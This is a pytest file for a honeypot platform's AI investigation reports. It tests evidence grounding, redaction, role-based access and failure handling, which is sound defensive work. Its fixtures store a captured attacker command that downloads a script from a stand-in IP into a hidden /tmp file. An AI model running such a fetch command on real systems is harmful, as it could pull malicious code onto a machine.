"""Evidence grounding, asynchronous lifecycle and role boundaries for AI reports."""
from datetime import datetime,timezone
from io import BytesIO
import asyncio,json
import pytest
from pypdf import PdfReader
from docx import Document
from sqlalchemy import select
from app.models import HoneypotSession,HoneypotNode,SessionStatus,AttackCategory,UserRole,AuditLog
from app.core.encryption import encrypt_data
from app.services import investigation_jobs as jobs_module
from app.services.investigation_jobs import report_jobs
from app.services.investigation_narrative import build_packet,validate_reply,NarrativeUnavailable

def reply_for(records):
 packet,_=build_packet(records);case=packet['cases'][0];ref=case['reference'];line_id,quote=next(iter(case['activity_lines'].items()))
 return {'summary':f"The recorded source attempted to retrieve a script [{ref}].",'findings':[{'title':'Script retrieval attempt','paragraph':f"The captured command {quote} requests a script and names /tmp/.a as its destination. The command alone does not prove the transfer completed [{ref}].",'references':[ref],'evidence_lines':[line_id],'quote':quote}],'assessment':f"The command supports a retrieval attempt, not a proven execution [{ref}].",'next_steps':f"Review any preserved payload and neighbouring session evidence [{ref}].",'scope':packet['scope'],'reviewed_references':[x['reference'] for x in packet['cases']],'model':'mock-local-model','generated_at':'2026-11-10T00:00:00Z'}

@pytest.fixture(autouse=True)
async def fake_local_model(monkeypatch):
 for job in report_jobs.jobs.values():
  if not job['task'].done():job['task'].cancel()
 report_jobs.jobs.clear()
 async def generate(records):return reply_for(records)
 monkeypatch.setattr(jobs_module,'generate_narrative',generate)
 yield
 tasks=[j['task'] for j in report_jobs.jobs.values()]
 for task in tasks:
  if not task.done():task.cancel()
 if tasks:await asyncio.gather(*tasks,return_exceptions=True)
 report_jobs.jobs.clear()

@pytest.fixture
async def captured(db_session):
 node=HoneypotNode(name='report-evidence-test',protocol='ssh',ip_address='192.0.2.1',port=2222)
 db_session.add(node);await db_session.flush()
 session=HoneypotSession(node_id=node.id,session_uuid='captured-evidence-test',protocol='ssh',attacker_ip='192.0.2.42',started_at=datetime.now(timezone.utc),status=SessionStatus.COMPLETED,attack_category=AttackCategory.EXPLOITATION,command_count=2,command_summary='Stored summary only',raw_commands_encrypted=encrypt_data('curl http://198.51.100.9/a.sh -o /tmp/.a\npassword=fixture-secret'),credentials_encrypted=encrypt_data(json.dumps([{'username':'fixture-admin','password':'fixture-password','success':False}])))
 db_session.add(session);await db_session.commit();return session

async def complete(client,headers,query):
 response=await client.post('/api/v1/export/reports?'+query,headers=headers)
 assert response.status_code==202,response.text
 identity=response.json()['id'];await report_jobs.jobs[identity]['task']
 return identity

async def test_actual_evidence_and_admin_credentials_in_pdf_and_word(client,auth_headers,captured,db_session):
 headers=await auth_headers(UserRole.ADMIN)
 identity=await complete(client,headers,f'session_ids={captured.id}&include_sensitive=true')
 status=await client.get(f'/api/v1/export/reports/{identity}',headers=headers)
 assert status.json()['status']=='complete'
 assert 'fixture-password' not in status.text and '198.51.100.9' not in status.text
 for fmt in ['pdf','docx']:
  response=await client.get(f'/api/v1/export/reports/{identity}/download?format={fmt}',headers=headers)
  assert response.status_code==200,response.text[:200]
  assert response.headers['x-export-count']=='1'
  if fmt=='pdf':text=' '.join(p.extract_text() for p in PdfReader(BytesIO(response.content)).pages)
  else:
   doc=Document(BytesIO(response.content));text=' '.join(p.text for p in doc.paragraphs)+' '+' '.join(c.text for t in doc.tables for row in t.rows for c in row.cells)
  for value in ['Script retrieval attempt','curl http://198.51.100.9/a.sh','fixture-password','fixture-secret','192.0.2.42','E1']:
   assert value in text,value
 audits=(await db_session.execute(select(AuditLog).where(AuditLog.action=='ai_report_downloaded'))).scalars().all()
 assert len(audits)==2 and all(x.details['include_sensitive'] for x in audits)

async def test_analyst_redaction_and_sensitive_permission(client,auth_headers,captured):
 headers=await auth_headers(UserRole.ANALYST)
 denied=await client.post('/api/v1/export/reports?include_sensitive=true',headers=headers);assert denied.status_code==403
 identity=await complete(client,headers,f'session_ids={captured.id}')
 response=await client.get(f'/api/v1/export/reports/{identity}/download',headers=headers)
 text=' '.join(p.extract_text() for p in PdfReader(BytesIO(response.content)).pages)
 assert 'fixture-password' not in text and 'fixture-secret' not in text
 assert '[REDACTED]' in text and '198.51.100.9' in text

async def test_other_owner_viewer_anonymous_and_limits(client,auth_headers,captured):
 admin=await auth_headers(UserRole.ADMIN);identity=await complete(client,admin,f'session_ids={captured.id}')
 analyst=await auth_headers(UserRole.ANALYST)
 assert (await client.get(f'/api/v1/export/reports/{identity}',headers=analyst)).status_code==404
 assert (await client.get(f'/api/v1/export/reports/{identity}/download',headers=analyst)).status_code==404
 viewer=await auth_headers(UserRole.VIEWER)
 assert (await client.post('/api/v1/export/reports',headers=viewer)).status_code==403
 assert (await client.post('/api/v1/export/reports')).status_code in [401,403]
 assert (await client.post('/api/v1/export/reports?'+'&'.join(f'session_ids={i}' for i in range(101)),headers=admin)).status_code==400
 assert (await client.post('/api/v1/export/reports?search=no-matching-session',headers=admin)).status_code==404

async def test_cached_narrative_reused_for_word_and_pdf(client,auth_headers,captured,monkeypatch):
 calls=[]
 async def count(records):calls.append(1);return reply_for(records)
 monkeypatch.setattr(jobs_module,'generate_narrative',count)
 headers=await auth_headers(UserRole.ADMIN)
 first=await complete(client,headers,f'session_ids={captured.id}')
 second=await complete(client,headers,f'session_ids={captured.id}')
 assert first==second and len(calls)==1

async def test_model_failure_is_visible_without_template_substitution(client,auth_headers,captured,monkeypatch):
 async def fail(records):raise NarrativeUnavailable('Local model unavailable; retry.')
 monkeypatch.setattr(jobs_module,'generate_narrative',fail)
 headers=await auth_headers(UserRole.ADMIN);identity=await complete(client,headers,f'session_ids={captured.id}')
 status=await client.get(f'/api/v1/export/reports/{identity}',headers=headers)
 assert status.json()['status']=='failed' and 'retry' in status.json()['message']
 assert (await client.get(f'/api/v1/export/reports/{identity}/download',headers=headers)).status_code==409

@pytest.mark.parametrize('fault',['reference','quote','address'])
def test_invalid_evidence_claims_are_rejected(fault):
 records=[({'session_uuid':'one','protocol':'ssh','attacker_ip':'192.0.2.42'}, {'category':'exploitation','evidence_commands':'curl http://198.51.100.9/a.sh -o /tmp/.a'})]
 packet,_=build_packet(records);reply=reply_for(records)
 if fault=='reference':reply['findings'][0]['evidence_lines']=['E999.L1']
 if fault=='quote':reply['findings'][0]['evidence_lines']=['E1.L999']
 if fault=='address':reply['summary']='Unexpected source 203.0.113.99 [E1]'
 with pytest.raises(NarrativeUnavailable):validate_reply(json.dumps(reply),packet)

def test_duplicate_activity_groups_keep_all_session_references():
 records=[({'session_uuid':f's-{i}','protocol':'ssh','attacker_ip':f'192.0.2.{i}'},{'category':'exploitation','evidence_commands':'whoami'}) for i in range(1,4)]
 packet,groups=build_packet(records)
 assert len(groups)==1 and len(groups[0]['sessions'])==3
 assert packet['scope']['selected_sessions']==3 and packet['scope']['model_reviewed_groups']==1


def test_word_preserves_original_multiline_command_quotations():
 from app.services.pdf_report import generate_pdf_report
 records=[({'session_uuid':'line-check','protocol':'ssh','attacker_ip':'192.0.2.42'},{'category':'reconnaissance','evidence_commands':'whoami\nid'})]
 narrative=reply_for(records);narrative['findings'][0]['quote']='whoami\nid'
 doc=Document(BytesIO(generate_pdf_report(records,'docx',narrative)))
 assert any('whoami\nid' in c.text for t in doc.tables for row in t.rows for c in row.cells)
